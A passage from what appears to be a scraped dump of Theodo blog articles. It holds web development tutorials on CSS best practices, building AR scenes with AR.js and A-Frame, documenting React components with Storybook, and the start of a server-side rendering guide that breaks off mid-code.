selector:\u00a0Specificity Calculator. Below is a chart to recap all these rules (taken from this funny post on specificity).\n\nSome basic knowledge of preprocessors\nPreprocessors are great because they allow you to write CSS faster. They also help to make the code more understandable and customizable by using variables. Here I will use a SCSS syntax in the examples (my favorite preprocessor but others like LESS/Stylus are pretty similar). An example of what you can do with preprocessors:\n// vars.scss\r\n$messageColor: #333;\r\n\r\n// message.scss\r\n@import 'vars';\r\n%message-shared {\r\n    border: 1px solid black;\r\n    padding: 10px;\r\n    color: $messageColor;\r\n}\r\n\r\n.message {\r\n    @extend %message-shared;\r\n}\r\n.success {\r\n    @extend %message-shared;\r\n    border-color: green;\r\n}\r\n\nVariables in CSS can now be done with native CSS but preprocessors still have the upper hand on readability/usability.\nWhat you should not do\nI will show you what you DON\u2019T want to do and explain why such coding practices will lead to many problems over time.\nDon\u2019t write undocumented CSS\nI put this point first because I believe it\u2019s one of the most impactful things you can act on straightaway. Like any other language, CSS needs to be commented. Most stylesheets don\u2019t have comments. And when I advise you to write comments, I don\u2019t talk about this:\n// Header style\r\n.header {}\r\n\nThose are bad comments because they have no purpose and convey no additional information. A good CSS comment explains the intention behind a selector/rule. Here is an example of some good comments:\n.suggestions {\r\n    // 1 should be enough but in fact there is a Bootstrap rule that says\r\n    // .btn-group>.btn:hover z-index: 2 (don't ask me why they did this)\r\n    z-index: 3;\r\n}\r\n\r\n// Firefox doesn't respect some CSS3 specs on the box model rules\r\n// regarding height. This is the only cross-brower way to do an \r\n// overflowing-y child in a fixed height container.\r\n// See https://blogs.msdn.microsoft.com/kurlak/2015/02/20/filling-the-remaining-height-of-a-container-while-handling-overflow-in-css-ie8-firefox-chrome-safari/\r\n.fixed-height-container {}\r\n\nWhat should you comment on?\n\nCSS hacks\nEvery line you didn\u2019t write or you wrote 6 months ago (which is the same) where you needed more than 10 seconds to understand its intended purpose.\nMagic values. Speaking of which\u2026\n\nDon\u2019t use magic values\nThe most common thing between developers resenting CSS is a general feeling of black magic. Put a rule here and an !important there, with a width value that looks good and it works. You see? Magic. But magic doesn\u2019t exist. You should have a more scientific approach to demystify CSS. Writing good comments is one thing. Stopping writing magic values is another.\nI define a magic value by \u201cany value that looks weird, aka is not a multiple of 5\u201d \u2013 even then some values may look weird. Examples of magic values are:\nleft: 157px;\r\nheight: 328px;\r\nz-index: 1501;\r\nfont-size: 0.785895rem;\r\n\nWhy are these values problematic? Because again, they do not convey the intention. What is better:\n\nUsing preprocessor variables which adds a meaning to a number.\nMake the exact calculation. If you wrote this value after some tests using the Chrome dev tools you may find out with a scientific approach that your initial \u201cmagic\u201d value may not be the most accurate one.\nCommenting the value to explain why it\u2019s here.\nChallenging your value/unit and changing it to a more pertinent one.\n\nExample:\nleft: calc(50% - ($width / 2));\r\n// An item have a 41px height:\r\n// 2*10px from padding+20px from line-height+1px from one border.\r\n// So to get 8 items in height:\r\nheight: 8 * 41px;\r\nz-index: 1501; // Needs to be above .navbar\r\nfont-size: 0.75rem;\r\n\nDon\u2019t use px units everywhere\nMost hellish CSS stylesheets use px units everywhere. In fact, you should almost never use them. In most cases, pixels never is the good unit to use. Why? Because they don\u2019t scale with the font-size or the device resolution. Here is a recap of which unit to use depending on the context. Quick cheat sheet:\n\npx: do not scale. Use for borders and the base font size on the html element. That\u2019s all.\nem, rem (> IE8): scale with the font-size. 1.5em is 150% of the font size of the current element. 0.75rem is 75% of the font size of the html element. Use rem for typography and everything vertical like margins and paddings. Use em wisely for elements relative to the font-size (icons as a font for instance) and use it for media query breakpoints.\n%, vh, vw (> IE8): scale with the resolution. vh and vw are percentages of the viewport height and width. These units are perfect for layouts or in a calc to compute the remaining space available (min-height: calc(100vh - #{$appBarHeight})).\n\nI made a page for you to play with the base font-size and CSS units (open in a new window to resize the viewport and try changing the zoom setting).\nDon\u2019t use !important\nYou should keep your specificity as low as possible. Otherwise, you will be overriding your override rules. If you tend to override your styles, with time passing you will hit the hard ceiling \u2013 !important and inline style. Then it will be a nightmare to create more specific CSS rules.\nUsing !important is a sign that you\u2019re working against yourself. Instead, you should understand why you have to do this. Maybe refactoring the impacted class will help you, or decoupling the common CSS in another class would allow you not to use it and lower your specificity.\nThe only times you should use it is when there is absolutely no other way to be more specific than an external library you are using.\nDon\u2019t use IDs as selectors\nKeep. Your. Specificity. Low. Using an ID instead of a class condemn you to not reuse the code you\u2019re writing right now. Furthermore, if your javascript code is using IDs as hooks it could lead to dead code (you are not certain whether you can remove this ID because it could be used by the JS and/or CSS).\nInstead of using IDs, try to look up common visual patterns you could factorize for future reuse. If you need to be specific, add a class on the lowest level of the DOM tree possible. At the very least, use a class with the name you would have given to your ID.\n// Don't\r\n#app-navbar {}\r\n\r\n// Slighlty better\r\n.app-navbar {}\r\n\r\n// Better (pattern that you could reuse)\r\n.horizontal-nav {}\r\n\nDon\u2019t use HTML elements as selectors\nAgain. Keep your specificity low. Using HTML tags as selectors goes against this because you will have to add higher-specificity selectors to overwrite them later on. For instance, styling the a element (especially the a element, with all its use cases and different states) will be an inconvenience when you use it in other contexts.\n// Don't\r\n<a>Link</a>\r\n<a class=\"button\">Call to action</a>\r\n<nav class=\"navbar\"><a>Navbar link</a></nav>\r\na { ... }\r\n.button { ... }\r\n// Because you will have to create more specific selectors\r\na.button { ...overrides that have nothing to do with the button style... }\r\n.navbar a { ...same... }\r\n\r\n// Better\r\n<a class=\"link\">Link</a>\r\n<a class=\"button\">Call to action</a>\r\n<nav class=\"navbar\"><a class=\"navbar-link\">Navbar link</a></nav>\r\n.link { ...style of a link, can be used anywhere... }\r\n.button { ...style of a button, idem... }\r\n.navbar-link { ...style of a navbar link, used only in navbars... }\r\n\nHowever, there are some cases when you could use them, for instance when a user wrote something like a blog post that is output in pure HTML format (therefore preventing you from adding custom classes).\n// Don't\r\nul { ... }\r\n\r\n// Better\r\n%textList { ... }\r\n.list { @extends %textList; }\r\n.user-article {\r\n    ul { @extends %textList; }\r\n}\r\n\nFurthermore, HTML should be semantic and the only hooks for style should be the classes. Don\u2019t be tempted to use an HTML tag because it has some style attached to it.\nA side-note on the ideal specificity\nYou should aim for a specificity of only one class for your CSS selectors.\nThe best part in Cascading Style Sheets is \u201ccascading\u201d. The worst part in Cascading Style Sheets is \u201ccascading\u201d \u2014 The Internet\nThe whole thing about CSS is that you want to make your style the same everywhere (therefore it needs to be reusable) AND you want to make it different in some unique places (therefore it needs to be specific). All CSS structure issues are variations of this basic contradiction.\nOpinion: The Cascading effect of CSS can be a great tool and it serves a purpose: to determine which CSS declaration is applied when there is a conflict. But it is not the best tool to solve this problem. What if instead, there were no conflicts on CSS declarations, ever? We wouldn\u2019t need the Cascade effect and everything would be reusable. Even \u201csuper-specific\u201d code can be written as a class that will be used only once. If you use selectors of only one class, you will never need to worry about specificity and overwriting styles between components.\n\u201cBut that could lead to a lot of duplicated source code\u201d, you could say. And you would be right if there were no CSS preprocessors. With preprocessors, defining mixins to reuse bits of CSS by composition is a great way to factor your code without using more specific selectors.\nThere is still a concern over performance because the output stylesheet is bigger. But for most stylesheets/projects, CSS performance is irrelevant over javascript concerns. Furthermore, the advantage of maintainability far outweighs the performance gains.\nIf we try to combine the last three Don\u2019ts, this is how I would take this code:\n<main id=\"main_page\">\r\n    <p><a>Some link</a></p>\r\n    <footer>\r\n        <a>Some other link</a>\r\n    </footer>\r\n</main>\r\n\r\na {\r\n    cursor: pointer;\r\n}\r\n\r\n#main_page {\r\n    a {\r\n        color: blue;\r\n\r\n        &:hover {\r\n            color: black;\r\n        }\r\n    }\r\n}\r\n\r\nfooter {\r\n    border: 1px solid black;\r\n\r\n    a {\r\n        color: grey !important;\r\n    }\r\n}\r\n\nAnd turn it into this:\n<main>\r\n    <p><a class=\"link\">Some link</a></p>\r\n    <footer class=\"footer\">\r\n        <a class=\"footer-link\">Some other link</a>\r\n    </footer>\r\n</main>\r\n\r\n.link {\r\n    cursor: pointer;\r\n    color: blue;\r\n\r\n    &:hover {\r\n        color: black;\r\n    }\r\n}\r\n\r\n.footer {\r\n    border: 1px solid black;\r\n\r\n    &-link {\r\n        // You can use a mixin here if there is a need to factor in\r\n        // the common code with .link\r\n        cursor: pointer;\r\n        color: grey;\r\n    }\r\n}\r\n\nWhat you can do right now\nDo try to understand how CSS declarations really work\nThere are some declarations you really want to understand. Because if you don\u2019t there will still be a feeling of \u201cblack magic\u201d happening.\n\nvertical-align: middle; margin: 0 auto; all the things!\nWhat you should know (tip: if you think you would not be able to explain it clearly to someone else, click the links):\n\nThe box model (width, height, padding, margin, border, box-sizing, display: block/inline/inline-block).\nPositioning and positioning contexts (position: static/relative/absolute/fixed, z-index).\nTypography (font-size, font-weight, line-height, text-transform, text-align, word-break, text-overflow, vertical-align)\nSelectors (*, >, +, ::before, ::after, :hover, :focus, :active, :first-child, :last-child, :not(), :nth-child())\n\nBonus ones to go further:\n\nA complete guide to tables\nTransitions\nShadows & filters\nFloats (only if you have to. My advice would be: don\u2019t use floats).\n\nDo look at Flexbox and Grid\nIf your Definition of Done doesn\u2019t include older browsers and you don\u2019t use/know the flexbox and/or grid model, it will solve a lot of your layout problems. You may want to check these great tutorials:\n\nA complete guide to Flexbox (Chrome \u2265 21, Firefox \u2265 28, IE \u2265 10, Safari \u2265 6.1)\nA complete guide to Grid (Chrome \u2265 57, Firefox \u2265 52, IE \u2265 10, Safari \u2265 10.3), a short example of grid use\n\nAn example of a possible layout implementation possible with Grid and that is not a nightmare to implement:\n\nDo look at BEM and CSS modules/styled components and apply it to new components\nYou should use CSS guidelines such as BEM. It will make your code more maintainable/reusable and prevent you from going down into the specificity hell. Here is a great article on BEM which I recommend.\nFurthermore, if you have a component-based architecture (such as React, Vue or Angular), I recommend CSS modules or styled components to remove the naming hassle of BEM (here is an article on the whole topic).\nOpinion: there is one main gotcha with these tools. You may believe that the auto-scoping feature of these tools acts as a pseudo-magic protection. However, beware that you should not bypass the above Don\u2019ts. For instance, using HTML elements in CSS modules selectors destroys the purpose of auto-scoping because it will cascade to all children components. You should also keep a strict BEM-like approach (structuring your component styles into blocks, elements, and modifiers) while using these kinds of tools.\nDo challenge and remove useless CSS\nA lot can be done by using only seven CSS properties. Do challenge CSS that does not seems essential. Is this linear-gradient background color essential when nobody sees the gradient effect? Are those box-shadow declarations really useful?\nYou can also find unused CSS with Chrome\u2019s CSS coverage. In the \u201cMore tools\u201d drop-down, activate the \u201cCoverage\u201d tool, start recording and crawl your target pages. Here is an example showing that the .TextStat class is never used, as well as 70% of the whole stylesheet.\n\nDo it yourself\nA note on frameworks like Bootstrap and others: they are useful for small and quick projects when you don\u2019t have time to dedicate to style. But for many medium-sized and a lot of large-sized projects, don\u2019t use them.\nOver time, you will need to overwrite them and it will eventually take more time than doing it yourself because it will produce a more complex and more specific code.\nIn addition, doing your style yourself makes you learn a lot. UI designer is a whole job so creating a UI from scratch is a real challenge. At first, try to reproduce the same look and feel than other websites you like (you can look at the code with the browser dev tools). My personal experience is that I started to love and learn CSS the moment I threw Bootstrap out the window for a personal project and started writing my own style.\n\nI hope that with all the above best practices you will feel more comfortable writing CSS and that it will help you enhance your code quality. In Part 2 I will address the hassle of migrating a hellish complex stylesheet full of black magic to a clean, understandable and maintainable one. So don\u2019t hesitate to share your CSS horror stories!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAlb\u00e9ric Trancart\r\n  \t\t\t\r\n  \t\t\t\tAlb\u00e9ric Trancart is an agile web developer at Theodo. He loves sharing what he has learnt and exchanging with great people.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIn this tutorial, you will see how to use ARjs on simple examples in order to discover this technology. You don\u2019t need any huge tech background in order to follow this tutorial.\n1 \u2013 Your very first AR example\nFirst we will start with a simple example that will help us understand all the elements we need to start an ARjs prototype.\nLibrary import\nAs I wished to keep it as simple as possible we will only use html static files and javascript libraries. Two external librairies are enough to start with ARjs.\nFirst we need A-Frame library, a web-framework for virtual reality. It is based on components that you can use as tag once defined.\nYou can import A-Frame library using the folowing line :\n<script src=\"https://aframe.io/releases/0.6.1/aframe.min.js\"></script>\r\n\nThen we need to import ARjs, the web-framework for augmented reality we are going to use.\n<script src=\"https://cdn.rawgit.com/jeromeetienne/AR.js/1.5.0/aframe/build/aframe-ar.js\"></script>\r\n\nInitialize the scene\nA-Frame works using a scene that contains the elements the user wants to display. To create a new scene, we use the a-scene tag :\n<a-scene stats embedded arjs='trackingMethod: best; debugUIEnabled: false'>\r\n  <!-- All our components goes here -->\r\n</a-scene>\r\n\nNote the 2 elements we have in our a-scene tag :\n\nstats : it displays stats about your application performance. You are free to remove it, but to start it will give us some useful information.\narjs : Here you can find some basic ARjs configuration. trackingMethod is the type of camera tracking you use, here we have choosen which is an auto configuration that will be great for our example. And debugUIEnabled is set at false in order to remove debugging tools from the camera view.\n\nShape\nThen we will use our first a-frame component. A-frame is built around a generic component a-entity that you use and edit to have the behaviour you want.\nIn this demo, we want to display a cube. Thankfully a components exists in A-frame, already implemented, that can be used to do that :\n<a-box position=\"0 0 0\" rotation=\"0 0 0\"></a-box>\r\n\na-box has a lot of attributes on which you can learn more in the official documentation, here we will focus on two attributes :\n\nposition : the three coordinates that will be used to position our components\nrotation : that color of the shape\n\nMarker\nWe are going to use a Hiro marker to start. It is a special kind of marker designed for augmented reality. We will dig deeper into other markers in one of the following part.\n\nDeployment\nAs announced we want to make our application accessible from a mobile device, so we will need to deploy our web page and make it accessible from our smartphone.\nhttp-server\nThere are a lot of node modules that you can use to start a development web server, I choose to use http-server which is very simple and can be used with a single command line.\nFirst you need to install the module by running the following command\nnpm install -g http-server\r\n\nThen to launch your server, you can do it with the command line :\nhttp-server\r\n\nYou can use other tools, such as the python based SimpleHTTPServer which is natively available on macOS with the following command:\npython -m SimpleHTTPServer 8000\r\n\nngrok\nNow that your server is running, you need to make your webpage accessible for your mobile device. We are going to use ngrok. It is a very simple command line tool that you can download from here : https://ngrok.com/download.\nThen you use ngrok with the following command :\nngrok http 8080\r\n\nIt will redirect all connections to the address : http://xxxxxx.ngrok.io, directly toward your server and your html page.\nSo with our index.html containing the following :\n<!doctype HTML>\r\n<html>\r\n<script src=\"https://aframe.io/releases/0.6.1/aframe.min.js\"></script>\r\n<script src=\"https://rawgit.com/donmccurdy/aframe-extras/master/dist/aframe-extras.loaders.min.js\"></script>\r\n<script src=\"https://cdn.rawgit.com/jeromeetienne/AR.js/1.5.0/aframe/build/aframe-ar.js\"> </script>\r\n  <body style='margin : 0px; overflow: hidden;'>\r\n    <a-scene stats embedded arjs='trackingMethod: best;'>\r\n      <a-marker preset=\"hiro\">\r\n      <a-box position='0 1 0' material='color: blue;'>\r\n      </a-box>\r\n      </a-marker>\r\n      <a-entity camera></a-entity>\r\n    </a-scene>\r\n  </body>\r\n</html>\r\n\nOr if you prefer on codepen.\nAnd the result should look like :\n\n2 \u2013 Animation\nNow that we were able to display our first A-frame component, we want to make it move.\nA-frame contains a component a-animation that has been designed to animate an entity. As A-frame uses tag components, the a-animation has to be inside the entity tag that you want to animate :\n  <a-entity>\r\n    <a-animation></a-animation>\r\n  </a-entity>\r\n\na-animation can be used on various attributes of our entity such as position, rotation, scale or even color.\nWe will see in the next part what can be done with these attributes.\nBasics\nFirst we will focus on some basic elements that we will need but you will see that it is enough to do a lot of things.\n\ndur : duration of the animation\nfrom : start position or state of the animation\nto : end position or state of the animation\nrepeat : if and how the animation should be repeated\n\nPosition\nWe will begin with the position, we want our object to move from one position to another. To start with this animation, we only need a 3 dimension vector indicating the initial position and the final position of our object.\nOur code should look like this :\n<a-animation attribute=\"position\"\r\n    dur=\"1000\"\r\n    from=\"1 0 0\"\r\n    to=\"0 0 1\">\r\n</a-animation>\r\n\nRotation\nRotations work the same, except that instead of a vector you have to indicate three angles :\n<a-animation attribute=\"rotation\"\r\n    dur=\"2000\"\r\n    from=\"0 0 0\"\r\n    to=\"360 0 0\"\r\n    repeat=\"indefinite\">\r\n</a-animation>\r\n\nYou can either make your entity rotate on itself:\n\nYou can access the full code here.\nOr make it rotates around an object:\n\nAnd the full code is here.\nOthers properties\nThis animation pattern works on a lot of others properties, for example :\n\nScale :\n\n<a-animation\r\n    attribute=\"scale\"\r\n    to=\"2 2 3\">\r\n</a-animation>\r\n\n\nColor :\n\n<a-animation\r\n    attribute=\"color\"\r\n    to=\"red\">\r\n</a-animation>\r\n\nTrigger\na-animation has a trigger : begin. That can either be used with a delay or an event. For example :\n<a-animation\r\n    begin=\"3000\"\r\n    attribute=\"color\"\r\n    to=\"red\">\r\n</a-animation>\r\n\nThis animation will start in 3000ms.\nOtherwise with an event you can use :\n<a-entity id=\"entity\">\r\n<a-animation\r\n    begin=\"colorChange\"\r\n    attribute=\"color\"\r\n    to=\"red\">\r\n</a-animation>\r\n\nWith the event emission :\ndocument.querySelector('#entity').emit('colorChange');\r\n\nCombining\nYou can of course, use multiple animations either by having multiple entities with their own animations or by having imbricated entities that share animation.\nFirst case is very simple you only have to add multiple entities with an animation for each.\nSecond one is more difficult because you must add an entity inside an entity, like in this example :\n<a-entity>\r\n    <a-animation attribute=\"rotation\"\r\n      dur=\"2000\"\r\n      easing=\"linear\"\r\n      from=\"0 0 0\"\r\n      to=\"0 360 0\"\r\n      repeat=\"indefinite\"></a-animation>\r\n          <a-entity rotation=\"0 0 25\">\r\n              <a-sphere position=\"2 0 2\"></a-sphere>\r\n          </a-entity>\r\n</a-entity>\r\n\nThe first entity is used as the axis for our rotating animation.\n3 \u2013 Model loading\nType of models\nYou can also load a 3D model inside ARjs and project it on a marker. A-frame works with various models type but glTF is privilegied so you should use it.\nYou can generate your model from software like Blender. I have not so much experience in this area, but if you are interested you should give a look at this list of tutorials: https://www.blender.org/support/tutorials/\nYou can also use an online library to download models, some of them even allow you to directly use their models.\nLoading a model from the internet\nDuring the building of this tutorial, I found KronosGroup github that allow me to made my very first examples with 3d model. You can find all their work here : https://github.com/KhronosGroup/glTF-Sample-Models\nWe will now discover a new component from A-frame : a-asset. It is used to load your assets inside A-frame, and as you can guess our 3d model is one of our asset.\nTo load your 3d model, we will use the following piece of code :\n<a-assets>\r\n      <a-asset-item id=\"smiley\" src=\"https://cdn.rawgit.com/KhronosGroup/glTF-Sample-Models/9176d098/1.0/SmilingFace/glTF/SmilingFace.gltf\"></a-asset-item>\r\n</a-assets>\r\n\nYou can of course load your very own model the same way.\na-asset works as a container that will contain the a-asset-item you will need in your page. Those a-asset-item are used to load 3d model.\nThe full example look like this.\nDisplay your model\nNow that we have loaded our model, we can add it into our scene and start manipulating it. To do that we will need to declare an a-entity inside our a-scene that will be binded to the id of our a-asset-item. The code look like :\n<a-entity gltf-model=\"#smiley\" rotation= \"180 0 0\">\r\n</a-entity>\r\n\nRemember what we did in the previous part with animation. We are still working with a-entity so we can do the same here. The full code for our moving smiley is here.\nAnd here is a demo :\n\n4 \u2013 Markers\nFor now we only have used Hiro marker, now we will see how we can use other kind of marker.\nBarcode\nIn ARjs barcode are also implemented in case you need to have a lot of different marker without waiting to create them from scratch. You first need to declare in the a-scene component what kind of marker you are looking for :\n<a-scene arjs='detectionMode: mono_and_matrix; matrixCodeType: 5x5;'></a-scene>\r\n\nAs you can guess, our value will be found in a 5\u00d75 matrix. And now the a-marker component will look like :\n<a-marker type='barcode' value='5'></a-marker>\r\n\nCustom marker\nYou can also use your very own custom marker. Select the image you want, and use this tool developed by ARjs developer.\nYou can then download the .patt file and you can use it in your application, like this:\n<a-marker-camera type='pattern' url='path/to/pattern-marker.patt'></a-marker-camera>\r\n\nMultiple markers\n<script src=\"https://aframe.io/releases/0.6.0/aframe.min.js\"></script>\r\n<script src=\"https://jeromeetienne.github.io/AR.js/aframe/build/aframe-ar.js\"></script>\r\n<body style='margin : 0px; overflow: hidden;'>\r\n  <a-scene embedded arjs='sourceType: webcam;'>\r\n\r\n    <a-marker type='pattern' url='path/to/pattern-marker.patt'>\r\n      <a-box position='0 0.5 0' material='color: red;'></a-box>\r\n    </a-marker>\r\n\r\n\r\n    <a-marker preset='hiro'>\r\n      <a-box position='0 0.5 0' material='color: green;'></a-box>\r\n    </a-marker>\r\n\r\n\r\n    <a-marker type='barcode' value='5'>\r\n      <a-box position='0 0.5 0' material='color: blue;'></a-box>\r\n    </a-marker>\r\n\r\n\r\n    <a-entity camera></a-entity>\r\n  </a-scene>\r\n</body>\r\n\nWhat\u2019s next\nYou now have everything you need to start and deploy a basic AR web application using ARjs.\nIf you are interested in web augmented or virtual reality you can give a deeper look at the A-Frame library so that you will see you can build more custom component or even component you can interact with.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBastien Teissier\r\n  \t\t\t\r\n  \t\t\t\tWeb developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA year ago I was a young developer starting his journey on React. My client came to see my team and told us: \u201cWe need to make reusable components\u201d, I asked him: \u201cWhat is a reusable component?\u201d and the answer was \u201cThis project is a pilot on the subject\u201d.\n2 months later another developer tried to use our components and the disillusion started: despite our efforts, our component were not reusable\u00a0\ud83d\ude31\nAt the time we managed to work with him to improve our code so that he could use it, but how could we have avoided the problem?\nThe answer was given to me by Florian Rival, a former developer at Bam, now working for Facebook: Storybook !\n Storybook, what is that?\nIt is an open source visual documentation software (here is the repo). It allows you to display the different states of your component. The cluster of all the different cases for your component are called the component stories.\nThis allows you to visually describe your components and so anyone who wants to use your components can just look at your stories and see how to use it. No need to dig in the code to find all the use cases, they are all there!\nA picture is worth a thousand words, I let you check the best example I know, the open Storybook of Airbnb.\nOne interesting thing to\u00a0note is that it\u2019s working with Vue, Angular and React!\nUsage example\nLet\u2019s make an example to explain this better to you. I will use a react todo list, I started with the one on this repo.\nThen I added Storybook to the project, I won\u2019t detail this part as the\u00a0Storybook doc\u00a0is very good. I would say it takes approximately 20 minutes to add storybook to your project, but might take longer to properly setup the webpack for your css.\nNow I\u2019ll focus on the component FilteredList that display the todos, first it looked like this:\n\r\nimport React from 'react';\r\nimport styled from 'styled-components';\r\nimport TodoItem from './TodoItem';\r\n\r\nconst StyledUl = styled.ul`\r\n  list-style: none;\r\n`;\r\n\r\nconst StyledP = styled.p`\r\n  margin: 10px 0;\r\n  padding: 10px;\r\n  border-radius: 0;\r\n  background: #f2f2f2;\r\n  border: 1px solid rgba(229, 229, 229, 0.5);\r\n  color: #888;\r\n`;\r\n\r\nexport default function FilteredList(props) {\r\n    const {items, changeStatus} = props;\r\n\r\n    if (items.length === 0) {\r\n        return (\r\n            <StyledP>There are no items.</StyledP>\r\n        );\r\n    }\r\n\r\n    return (\r\n        <StyledUl>\r\n            {items.map(item => (\r\n                <TodoItem key={item.id} data={item} changeStatus={changeStatus}/>\r\n            ))}\r\n        </StyledUl>\r\n    );\r\n}\r\n\n(It is not exactly the same as the one on the repo, I\u00a0used styled-component instead of plain css)\nTodoItem is the component that displays an element of the list.\nHere we can see there are two different branches in the render: the nominal case and the empty state.\nLet\u2019s write some stories, I created a file FilteredList.stories.js\u00a0and added this inside:\n\r\nimport React from 'react';\r\nimport { storiesOf } from '@storybook/react';\r\nimport FilteredList from \"./FilteredList\";\r\n\r\nconst data = [{\r\n    id: 1,\r\n    completed: true,\r\n    text: 'Jean-Claude Van Damme'\r\n}];\r\n\r\nstoriesOf('FilteredList')\r\n    .add('Nominal usage', () => (\r\n        <FilteredList items={data} changeMode={() => void 0}/>\r\n    ))\r\n    .add('Empty state', () => (\r\n        <FilteredList items={[]} changeMode={() => void 0}/>\r\n    ));\r\n\nSo what did I do here?\nI defined placeholder data in a variable for the component props.\nWe use the function storiesOf\u00a0from storybook, this function takes the name we want to give to the group of stories as entry param.\nThen we add some stories with .add. It is is pretty much working like jest or mocha\u2019s\u00a0describe or\u00a0it\u00a0in tests, it takes the name of the story and a function that returns the component to render.\nHere\u2019s what it looks like:\n\n\nIt\u2019s rather simple but it\u2019s working, we see the two different cases.\nWhat if we add other branches? Lets say the parent component of FilteredList\u00a0is calling an API to get the list and so we have to add a loading and error state.\n\r\nexport default function FilteredList(props) {\r\n    const {items, changeStatus, isLoading, error} = props;\r\n\r\n    if (isLoading) {\r\n        return (\r\n            <StyledP>Loading...</StyledP>\r\n        )\r\n    }\r\n\r\n    if (error) {\r\n        return (\r\n            <StyledP>Sorry an error occurred with the following message: {error}</StyledP>\r\n        )\r\n    }\r\n    \r\n    //...\r\n}\r\n\nNow we need to add the corresponding stories.\n\r\n.add('Loading state', () => (\r\n        <FilteredList items={[]} changeMode={() => void 0} isLoading />\r\n))\r\n.add('Error state', () => (\r\n    <FilteredList items={[]} changeMode={() => void 0} error=\"Internal server error\"/>\r\n));\r\n\nAnd now our Storybook looks like:\n\n\nThis example is rather simple but it is showing pretty well how we worked with Storybook. Each time you create new component behaviors you then create the corresponding stories.\nAin\u2019t nobody got time for that\nIn fact it takes time when you are coding but I feel like it is more like a investment.\nWhen you develop your app\u00a0aren\u2019t you trying to make it as easy to use? Then why not make it easy for developers to use your code?\nAnd that\u2019s where Storybook is helping you, now your components are easier to share, this leads to a better collaboration between developers and therefore to better component development practices shared inside the team.\nThis is very important because you are not the only user of your code, you\u2019re maybe working with a team or someone else will\u00a0take over\u00a0your project afterwards.\nWe all had this part in our project code that have been here for ages and no one really know how to deal with it, how to avoid that? Make it good the first time you code it! Seems obvious but still is right, and for that you can use Storybook to share your front end components and make perfect APIs! (or at least very good ones)\nFinal thoughts\nIn a way we are all trying to do reusable components \u2013 whether you are trying to do a library or not, you want other members of your team to be able to update/fix your code. It\u2019s not easy to make perfect APIs for your components if you can not have a lot of user feedback and that\u2019s why Storybook or any visual doc are so efficient. They improve greatly the vision others have of your component and help them modify it without breaking anything.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tL\u00e9o Anesi\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tUsually, we are completely running React.js on client-side: Javascript is interpreted by your browser. The initial html returned by the server contains a placeholder, e.g.\u00a0<div id=\"root\"></div>, and then, once all your scripts are loaded, the entire UI is rendered in the browser. We call it client-side rendering.\nThe problem is that, in the meantime, your visitor sees\u2026 nothing, a blank page!\nLooking for how to get rid of this crappy blank page for a personal project, I discovered Next.js: in my opinion the current best framework for making server-side rendering and production ready React applications.\nWhy SSR (Server-Side Rendering)?\nThis is not the point of this article, but here is a quick sum-up of what server-side rendering can bring to your application:\n\nImprove your SEO\nSpeed up your first page load\nAvoid blank page flicker before rendering\n\nIf you want to know more about it, please read this great article: Benefits of Server-Side Over Client Side Rendering.\nBut let\u2019s focus on the \u201chow\u201d rather than the \u201cwhy\u201d here.\nWhat\u2019s the plan?\nFor this article, I start with a basic app made\u00a0with\u00a0create-react-app. Your own React application is probably using similar settings.\nThis article is split in 3 sections matching 3 server-side-rendering strategies:\n\nHow tomanually upgrade your React app to get\u00a0SSR\nHow to start with Next.js from scratch\nMigrate your existing React app to server-side with Next.js\n\nI won\u2019t go through all the steps, but I will bring your attention on the main points of interesting. I also provide a repository for each of the 3 strategies. As the article is a bit long, I\u2019ve split it in 2 articles, this one will only deal with the first 2 sections. If your main concern is to migrate your app to Next.js, you can go directly to the second article\u00a0(coming soon).\n1) Look how twisted manual SSR is\u2026\n\nIn this part, we will see how to implement Server-side Rendering\u00a0manually on an existing React app. Let\u2019s take the\u00a0create-react-app\u00a0starter code:\n\npackage.json\u00a0for dependencies\nWebpack configuration included\nApp.js\u00a0\u2013 loads React and renders the Hello component\nindex.js\u00a0\u2013 puts all together into a root component\n\nChecking rendering type\nI just added to the code base a simple function\u00a0isClientOrServer\u00a0based on the availability of\u00a0the Javascript object window representing the browser\u2019s window:\nconst isClientOrServer = () => {\r\n  return (typeof window !== 'undefined' && window.document) ? 'client' : 'server';\r\n};\r\n\nso that we display on the page what is rendering the application: server or client.\nTest it by yourself\n\nclone\u00a0this repository\ncheckout the initial commit\ninstall the dependencies with\u00a0yarn\nlaunch the dev server with\u00a0yarn start\nbrowse to\u00a0http://localhost:3000\u00a0to view the app\n\nI am now simulating a \u20183G network\u2019 in Chrome so that we really understand what is going on:\n\nImplementing\u00a0Server-side Rendering\nLet\u2019s fix that crappy flickering with server-side rendering! I won\u2019t show all the code (check the repo to see it in details) but here are the main steps.\nWe first need a node server using Express:\u00a0yarn add express.\nIn our React app, Webpack only loads the src/ folder, we can thus create a new folder named server/ next to it. Inside, create a file\u00a0index.js\u00a0where we use express and a server renderer.\n// use port 3001 because 3000 is used to serve our React app build\r\nconst PORT = 3001; const path = 